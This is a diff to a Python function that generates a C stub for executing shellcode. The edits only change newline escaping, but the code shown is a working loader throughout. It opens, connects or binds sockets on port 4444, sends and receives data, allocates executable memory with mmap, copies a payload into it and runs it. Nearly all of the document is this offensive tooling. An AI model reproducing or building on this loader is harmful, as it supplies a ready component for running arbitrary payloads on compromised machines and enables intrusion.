@@ -1031,17 +1031,17 @@ def generate_c_stub(shellcode_c):
             int open_socket() {{
                 int sockfd = socket(AF_INET, SOCK_STREAM, 0);
                 if (sockfd >= 0) {{
-                    write(1, "[+] Socket opened\n", 18);
+                    write(1, "[+] Socket opened\\n", 18);
                     conn_info.sockfd = sockfd;
                 }} else {{
-                    write(1, "[-] Failed to open socket\n", 26);
+                    write(1, "[-] Failed to open socket\\n", 26);
                 }}
                 return sockfd;
             }}
 
             int connect_socket(const char *ip, int port) {{
                 if (conn_info.sockfd < 0) {{
-                    write(1, "[-] No socket available\n", 24);
+                    write(1, "[-] No socket available\\n", 24);
                     return -1;
                 }}
 
@@ -1050,18 +1050,18 @@ def generate_c_stub(shellcode_c):
                 conn_info.addr.sin_addr.s_addr = inet_addr(ip);
 
                 if (connect(conn_info.sockfd, (struct sockaddr *)&conn_info.addr, sizeof(conn_info.addr)) == 0) {{
-                    write(1, "[+] Connected\n", 14);
+                    write(1, "[+] Connected\\n", 14);
                     conn_info.is_connected = 1;
                     return 0;
                 }} else {{
-                    write(1, "[-] Connection failed\n", 22);
+                    write(1, "[-] Connection failed\\n", 22);
                     return -1;
                 }}
             }}
 
             int listen_socket(int port) {{
                 if (conn_info.sockfd < 0) {{
-                    write(1, "[-] No socket available\n", 24);
+                    write(1, "[-] No socket available\\n", 24);
                     return -1;
                 }}
 
@@ -1070,12 +1070,12 @@ def generate_c_stub(shellcode_c):
                 conn_info.addr.sin_addr.s_addr = INADDR_ANY;
 
                 if (bind(conn_info.sockfd, (struct sockaddr *)&conn_info.addr, sizeof(conn_info.addr)) < 0) {{
-                    write(1, "[-] Bind failed\n", 16);
+                    write(1, "[-] Bind failed\\n", 16);
                     return -1;
                 }}
 
                 if (listen(conn_info.sockfd, 5) < 0) {{
-                    write(1, "[-] Listen failed\n", 18);
+                    write(1, "[-] Listen failed\\n", 18);
                     return -1;
                 }}
 
@@ -1085,30 +1085,30 @@ def generate_c_stub(shellcode_c):
 
             int send_data(const char *data, size_t len) {{
                 if (conn_info.sockfd < 0 || !conn_info.is_connected) {{
-                    write(1, "[-] Not connected\n", 18);
+                    write(1, "[-] Not connected\\n", 18);
                     return -1;
                 }}
 
                 ssize_t bytes_sent = send(conn_info.sockfd, data, len, 0);
                 if (bytes_sent > 0) {{
-                    write(1, "[+] Data sent\n", 14);
+                    write(1, "[+] Data sent\\n", 14);
                 }} else {{
-                    write(1, "[-] Send failed\n", 16);
+                    write(1, "[-] Send failed\\n", 16);
                 }}
                 return bytes_sent;
             }}
 
             int recv_data(char *buffer, size_t len) {{
                 if (conn_info.sockfd < 0 || !conn_info.is_connected) {{
-                    write(1, "[-] Not connected\n", 18);
+                    write(1, "[-] Not connected\\n", 18);
                     return -1;
                 }}
 
                 ssize_t bytes_recv = recv(conn_info.sockfd, buffer, len, 0);
                 if (bytes_recv > 0) {{
-                    write(1, "[+] Data received\n", 18);
+                    write(1, "[+] Data received\\n", 18);
                 }} else {{
-                    write(1, "[-] Receive failed\n", 19);
+                    write(1, "[-] Receive failed\\n", 19);
                 }}
                 return bytes_recv;
             }}
@@ -1117,12 +1117,12 @@ def generate_c_stub(shellcode_c):
                 void *mem = mmap(0, len, PROT_READ | PROT_WRITE | PROT_EXEC,
                                 MAP_ANON | MAP_PRIVATE, -1, 0);
                 if (mem == MAP_FAILED) {{
-                    write(1, "[-] Memory allocation failed\n", 29);
+                    write(1, "[-] Memory allocation failed\\n", 29);
                     return;
                 }}
 
                 memcpy(mem, payload, len);
-                write(1, "[+] Executing payload\n", 22);
+                write(1, "[+] Executing payload\\n", 22);
                 ((void(*)())mem)();
                 munmap(mem, len);
             }}
@@ -1133,29 +1133,29 @@ def generate_c_stub(shellcode_c):
                         open_socket();
                         break;
                     case FUNC_CONNECT:
-                        write(1, "[*] Connecting to 127.0.0.1:4444\n", 33);
+                        write(1, "[*] Connecting to 127.0.0.1:4444\\n", 33);
                         connect_socket("127.0.0.1", 4444);
                         break;
                     case FUNC_LISTEN:
-                        write(1, "[*] Listening on port 4444\n", 27);
+                        write(1, "[*] Listening on port 4444\\n", 27);
                         listen_socket(4444);
                         break;
                     case FUNC_SEND:
-                        write(1, "[*] Sending data...\n", 20);
+                        write(1, "[*] Sending data...\\n", 20);
                         send_data("Hello from stub\n", 16);
                         break;
                     case FUNC_RECV: {{
-                        write(1, "[*] Receiving data...\n", 22);
+                        write(1, "[*] Receiving data...\\n", 22);
                         char buffer[1024];
                         recv_data(buffer, sizeof(buffer));
                         break;
                     }}
                     case FUNC_EXECUTE:
-                        write(1, "[*] Executing payload...\n", 25);
+                        write(1, "[*] Executing payload...\\n", 25);
                         execute_payload((char *)code, sizeof(code));
                         break;
                     default:
-                        write(1, "[-] Unknown action.\n", 21);
+                        write(1, "[-] Unknown action.\\n", 21);
                         break;
                 }}
             }}
